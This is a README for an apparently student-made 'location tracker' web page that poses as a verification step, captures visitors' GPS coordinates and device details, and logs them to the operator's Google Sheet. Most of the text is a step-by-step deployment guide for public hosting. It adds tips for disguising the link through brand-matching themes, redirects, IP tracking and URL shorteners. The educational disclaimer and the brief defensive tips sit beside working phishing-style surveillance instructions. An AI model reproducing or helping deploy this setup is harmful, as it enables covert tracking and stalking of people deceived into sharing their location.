# 🌐 Location Tracker — Educational Cybersecurity Project

> **⚠️ DISCLAIMER:** This project is strictly for **educational purposes** as part of a college tech lab. Do not use this for unauthorized tracking. Always obtain consent before tracking anyone's location. Misuse may violate privacy laws.

---

## 📋 What This Project Does

When someone opens your link:
1. The page asks for **location permission** (disguised as a verification page)
2. If they allow it, the browser's **Geolocation API** captures their coordinates
3. The data is sent to your **Google Sheet** via Google Apps Script
4. You see their **location, timestamp, device info, and a Google Maps link** in real-time

---

## 📁 Project Structure

```
location/
├── index.html              # Frontend page (the tracking link)
├── google_apps_script.js   # Code to paste in Google Apps Script
├── server.py               # Local test server (Python)
└── README.md               # This file
```

---

## 🚀 Setup Guide (Step by Step)

### Step 1: Create a Google Sheet

1. Go to [Google Sheets](https://sheets.google.com)
2. Click **"+ Blank"** to create a new spreadsheet
3. Name it **"Location Tracker"** (or anything you prefer)
4. Keep this tab open — you'll need it

### Step 2: Set Up Google Apps Script

1. In your Google Sheet, go to **Extensions → Apps Script**
2. This opens the Apps Script editor
3. **Delete** all existing code in the editor
4. Open the file `google_apps_script.js` from this project
5. **Copy the entire code** and **paste** it into the Apps Script editor
6. Click the **💾 Save** icon (or `Ctrl+S`)
7. Name the project **"Location Tracker Script"**

### Step 3: Deploy the Apps Script as a Web App

1. In Apps Script editor, click **Deploy → New deployment**
2. Click the **⚙️ gear icon** next to "Select type" and choose **"Web app"**
3. Fill in:
   - **Description:** `Location Tracker`
   - **Execute as:** `Me (your email)`
   - **Who has access:** `Anyone`
4. Click **Deploy**
5. **Authorize** the app when prompted (click through the "unsafe" warnings — it's your own script)
6. **Copy the Web App URL** — it looks like:
   ```
   https://script.google.com/macros/s/AKfycb.../exec
   ```

### Step 4: Configure the Tracking Page

1. Open `index.html` in a text editor
2. Find this line near the top of the `<script>` section:
   ```javascript
   const GOOGLE_SCRIPT_URL = "YOUR_GOOGLE_APPS_SCRIPT_URL_HERE";
   ```
3. **Replace** `YOUR_GOOGLE_APPS_SCRIPT_URL_HERE` with the URL you copied in Step 3
4. **Save** the file

### Step 5: Test Locally

1. Open a terminal in the project folder
2. Run:
   ```bash
   python3 server.py
   ```
3. Your browser will open `http://localhost:8080`
4. Click **"Continue Verification"** and allow location access
5. Check your Google Sheet — a new row should appear! ✅

---

## 🌍 Deploying Online (To Share the Link)

For the link to work when shared with others, you need to **host it on HTTPS**. Here are free options:

### Option A: GitHub Pages (Recommended)
1. Push this project to a GitHub repository
2. Go to **Settings → Pages**
3. Set source to `main` branch
4. Your link: `https://yourusername.github.io/reponame/`

### Option B: Netlify (Drag & Drop)
1. Go to [netlify.com](https://www.netlify.com)
2. Sign up (free)
3. Drag and drop the `location/` folder
4. Get your free HTTPS link instantly

### Option C: Vercel
1. Go to [vercel.com](https://vercel.com)
2. Import from GitHub or upload
3. Get a free HTTPS link

---

## 📊 Data Collected in Google Sheet

| Column | Description |
|--------|-------------|
| Timestamp | When the link was opened |
| Latitude | GPS latitude coordinate |
| Longitude | GPS longitude coordinate |
| Accuracy | Location accuracy in meters |
| Google Maps Link | Clickable link to see location on map |
| User Agent | Browser and OS information |
| Platform | Device platform (Windows, Linux, etc.) |
| Language | Browser language setting |
| Screen Resolution | Device screen size |
| Referrer | Where they came from |

---

## 🔧 Customization Ideas

- **Change the page theme:** Edit the CSS in `index.html` to match any brand
- **Add a redirect:** After capturing location, redirect to any website
- **Add IP tracking:** Use a free IP API like `https://api.ipify.org` 
- **URL shortener:** Use bit.ly to shorten the link and make it look cleaner
- **Custom domain:** Point a custom domain to your hosted page

---

## ⚠️ Important Notes

1. **HTTPS Required:** Geolocation API only works on HTTPS (or localhost). Always deploy on HTTPS.
2. **User Must Allow:** The browser asks for permission. If denied, location cannot be captured.
3. **Accuracy Varies:** GPS accuracy depends on the device (phone GPS is more accurate than laptop).
4. **Educational Only:** This is a learning tool to understand how web APIs and data collection work.

---

## 🛡️ How to Protect Yourself

This project also teaches **defense**:
- Always check URLs before clicking unknown links
- Deny location permissions to untrusted websites
- Use a VPN to mask your approximate location
- Review browser permissions regularly in settings
- Use browser extensions that block location requests

---

## 📜 License

This project is for **educational purposes only** — part of a college tech lab demonstration.

---

*Built with ❤️ for learning cybersecurity concepts*
